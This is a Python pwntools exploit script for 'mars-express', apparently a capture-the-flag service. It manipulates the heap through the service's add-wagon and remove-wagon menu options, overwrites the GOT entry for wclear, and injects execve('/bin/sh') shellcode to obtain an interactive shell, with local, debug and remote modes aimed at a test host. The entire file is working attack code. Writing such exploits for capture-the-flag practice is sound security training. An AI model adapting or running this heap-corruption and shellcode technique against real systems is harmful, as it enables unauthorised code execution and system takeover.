#!/usr/bin/env python
"""Exploit script for mars-express."""
import subprocess
import sys
import os

import pwn


pwn.context.log_level = "info"
pwn.context.terminal = ["tmux", "splitw", "-p", "75"]

BINARY = "../src/mars-express"

HOST = "vulnbox-test.faust.ninja"
PORT = 8888

GDB_COMMANDS = []


MENU = """What do you want to do?"""


def add_wagon(proc, name: str, symbol: str = "x") -> None:
    """Adds a wagon to the train."""
    proc.recvuntil(MENU)
    proc.sendline("1")
    proc.recvuntil("name: ")
    proc.sendline(name)
    proc.recvuntil("symbol: ")
    proc.sendline(symbol)


def remove_wagon(proc, name: str) -> None:
    """Removes a wagon from the train."""
    proc.recvuntil(MENU)
    proc.sendline("2")
    proc.recvuntil("wagon: ")
    proc.sendline(name)


def exploit(proc, mode: str) -> None:
    """Exploit goes here."""

    proc.recvuntil("> ")
    proc.sendline("1")
    proc.recvuntil("name:")
    proc.sendline("some_random_name")

    addr = pwn.context.binary.got["wclear"] - 8
    pwn.log.info(f"addr = 0x{addr:08x}")

    # These values depend on the build system, since the bss might starts at a different offset
    add_wagon(proc, "a"*31)
    add_wagon(proc, "a"*15)

    add_wagon(proc, b"b"*8 + pwn.p32(addr) + b"\x20" + b"\0"*3 + b"b"*43)
    add_wagon(proc, "c"*15)

    add_wagon(proc, "e"*15)
    add_wagon(proc, "f"*15)

    remove_wagon(proc, "f"*15)
    remove_wagon(proc, "e"*15)

    add_wagon(proc, "g"*16)

    add_wagon(proc, "h"*15)

    if mode == "debug":
        pwn.pause()

    shellcode = "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    shellcode = shellcode.ljust(0x1f, "\x90")
    add_wagon(proc, shellcode)

    if mode == "remote":
        try:
            proc.recvuntil("X", timeout=1)
        except EOFError:
            pwn.log.info("Remember to provide remote binary in 'src/mars-express'!")
            return

    # TODO: parse all trains.

    proc.interactive()



def main() -> None:
    """Does general setup and calls exploit."""
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <mode>")
        sys.exit(0)

    env = os.environ.copy()

    try:
        pwn.context.binary = pwn.ELF(BINARY)
    except IOError:
        print(f"Failed to load binary ({BINARY})")

    mode = sys.argv[1]

    env["TERM"] = "ansi77"
    env["COLUMNS"] = "40"
    env["ROWS"] = "20"

    if mode == "local":
        proc = pwn.process(BINARY, env=env)

    elif mode == "debug":
        proc = pwn.process(BINARY, env=env)
        gdb_cmd = ["tmux",
                   "split-window",
                   "-p",
                   "75",
                   "gdb",
                   BINARY,
                   str(proc.pid),
                   ]

        for cmd in GDB_COMMANDS:
            gdb_cmd.append("-ex")
            gdb_cmd.append(cmd)

        gdb_cmd.append(BINARY)

        subprocess.Popen(gdb_cmd)

    elif mode == "local_hosted":
        proc = pwn.remote("localhost", PORT)
    elif mode == "remote":
        proc = pwn.remote(HOST, PORT)

    else:
        print("Invalid mode")
        sys.exit(1)

    exploit(proc, mode)

if __name__ == "__main__":

    main()
